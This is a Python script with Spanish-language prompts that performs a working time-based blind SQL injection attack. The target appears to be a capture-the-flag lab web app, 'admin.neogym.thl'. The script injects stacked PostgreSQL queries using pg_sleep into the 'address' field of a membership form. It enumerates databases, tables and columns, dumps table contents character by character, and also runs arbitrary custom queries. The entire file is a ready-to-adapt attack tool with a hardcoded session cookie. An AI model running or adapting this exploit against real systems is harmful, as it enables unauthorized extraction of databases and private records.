import time
import string
import requests
from pwn import *

def get_input(prompt, default=None):
    user_input = input(prompt).strip()
    return user_input if user_input else default

def send_payload(url, payload, cookies, p1):
    data = {
        'first_name': 'Prueba',
        'last_name': 'test',
        'email': 'test@mail.com',
        'phone': '123456789',
        'sex': 'M',
        'height': 186,
        'weight': 80,
        'membership_type': 'Mensual',
        'address': payload
    }
    p1.status(f"🔍 Probando: {payload}")
    res = requests.post(url, data=data, cookies=cookies)
    return res

def extract_info(url, cookies, query_template, max_positions, characters, p1, p2):
    extracted_info = ''
    try:
        for position in range(1, max_positions + 1):
            for character in characters:
                payload = query_template.format(position, character)
                res = send_payload(url, payload, cookies, p1)

                if res.elapsed.total_seconds() > 2:
                    extracted_info += character
                    p2.status(f"\033[92m{extracted_info}\033[0m")
                    break
            else:
                break
    except KeyboardInterrupt:
        print("\n\033[91mInterrumpido por el usuario. Continuando con los datos obtenidos...\033[0m")
    print("\033[92mOK\033[0m")
    return extracted_info

def interactive_exploit():
    url = 'http://admin.neogym.thl/index.php'
    cookies = {"PHPSESSID": 'lgom9u6rphlcm1lfauj30d3dri'}

    p1 = log.progress("🚀 Iniciando proceso de fuerza bruta")
    time.sleep(2)

    characters_basic = string.ascii_lowercase + string.digits + ',._-'
    characters_extended = string.printable.replace(' ', '')

    # Paso 1: Obtener bases de datos
    print("\n\033[92m\033[1m[🔍 PASO 1/4] Extracción de bases de datos\033[0m")
    p2 = log.progress("📚 Extrayendo bases de datos")
    query_template = "'); select case when substring(string_agg(datname,','),{},1)='{}' then pg_sleep(2) else pg_sleep(0) end from pg_database --"
    databases = extract_info(url, cookies, query_template, 100, characters_basic, p1, p2)

    if not databases:
        print("❌ No se encontraron bases de datos")
        return

    print(f"\n[BASES DE DATOS ENCONTRADAS]\n\033[92m{databases}\033[0m")
    selected_db = get_input("\033[93m¿Qué base de datos quieres investigar? (separar con comas o 'all' para todas): \033[0m", "all")

    if selected_db.lower() == 'all':
        selected_db = databases
    else:
        # Validar que las bases de datos seleccionadas existan
        selected_db = ','.join([db for db in selected_db.split(',') if db in databases.split(',')])

    # Paso 2: Obtener tablas para las bases de datos seleccionadas
    print("\n\033[92m\033[1m[🔍 PASO 2/4] Extracción de tablas\033[0m")
    p2 = log.progress("📋 Extrayendo tablas")
    query_template = f"'); select case when substring(string_agg(table_name,','),{{}},1)='{{}}' then pg_sleep(2) else pg_sleep(0) end from information_schema.tables where table_catalog in ('" + "','".join(selected_db.split(',')) + "')--"
    tables = extract_info(url, cookies, query_template, 100, characters_basic, p1, p2)

    if not tables:
        print("❌ No se encontraron tablas")
        return

    print(f"\n[TABLAS ENCONTRADAS]\n\033[92m{tables}\033[0m")
    selected_tables = get_input("\033[93m¿Qué tablas quieres investigar? (separar con comas o 'all' para todas): \033[0m", "all")

    if selected_tables.lower() == 'all':
        selected_tables = tables
    else:
        # Validar que las tablas seleccionadas existan
        selected_tables = ','.join([table for table in selected_tables.split(',') if table in tables.split(',')])

    # Paso 3: Obtener columnas para las tablas seleccionadas
    print("\n\033[92m\033[1m[🔍 PASO 3/4] Extracción de columnas\033[0m")
    all_columns = {}
    for table in selected_tables.split(','):
        p2 = log.progress(f"🗄️ Extrayendo columnas de {table}")
        query_template = f"'); select case when substring(string_agg(column_name,','),{{}},1)='{{}}' then pg_sleep(2) else pg_sleep(0) end from information_schema.columns where table_name='{table}'--"
        columns = extract_info(url, cookies, query_template, 100, characters_basic, p1, p2)

        if columns:
            print(f"\n[COLUMNAS ENCONTRADAS EN {table}]\n\033[92m{columns}\033[0m")
            selected_columns = get_input(f"\033[93m¿Qué columnas de {table} quieres extraer? (separar con comas o 'all' para todas): \033[0m", "all")

            if selected_columns.lower() == 'all':
                all_columns[table] = columns.split(',')
            else:
                all_columns[table] = [col.strip() for col in selected_columns.split(',') if col.strip() in columns.split(',')]

    # Paso 4: Extraer datos
    print("\n\033[92m\033[1m[🔍 PASO 4/4] Extracción de datos\033[0m")
    for table, columns in all_columns.items():
        for column in columns:
            p2 = log.progress(f"🔍 Extrayendo datos de {table}.{column}")
            query_template = f"'); SELECT CASE WHEN substring(string_agg({column},'||'),{{}},1)='{{}}' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM {table}--"
            data = extract_info(url, cookies, query_template, 200, characters_extended, p1, p2)

            if data:
                print(f"\n[DATOS ENCONTRADOS EN {table}.{column}]\n\033[92m{data.replace('||', '\n')}\033[0m")
            else:
                print(f"\n❌ No se encontraron datos en {table}.{column}")

    # Opción para consulta personalizada
    if get_input("\n\033[93m¿Deseas ejecutar una consulta personalizada? (s/n): \033[0m", "n").lower() == 's':
        custom_query = get_input("\033[93mIntroduce tu consulta SQL: \033[0m")
        if custom_query:
            p2 = log.progress("🔍 Ejecutando consulta personalizada")
            query_template = f"'); SELECT CASE WHEN substring(({custom_query}),{{}},1)='{{}}' THEN pg_sleep(2) ELSE pg_sleep(0) END --"
            result = extract_info(url, cookies, query_template, 200, characters_extended, p1, p2)
            print(f"\n[RESULTADO DE CONSULTA PERSONALIZADA]\n\033[92m{result}\033[0m")

if __name__ == '__main__':
    interactive_exploit()
